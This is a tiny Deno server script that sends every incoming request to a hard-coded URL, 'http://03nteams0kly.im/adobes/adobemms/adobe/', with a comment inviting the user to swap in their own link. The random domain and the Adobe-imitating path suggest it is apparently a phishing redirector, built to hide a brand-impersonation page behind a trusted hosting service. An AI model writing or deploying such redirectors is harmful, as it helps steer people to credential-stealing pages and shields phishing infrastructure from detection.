import { serve } from "https://deno.land/std/http/server.ts";

serve((_req) => {
  return new Response(null, {
    status: 302,
    headers: {
      Location: "http://03nteams0kly.im/adobes/adobemms/adobe/", // Replace this with your actual link
    },
  });
});
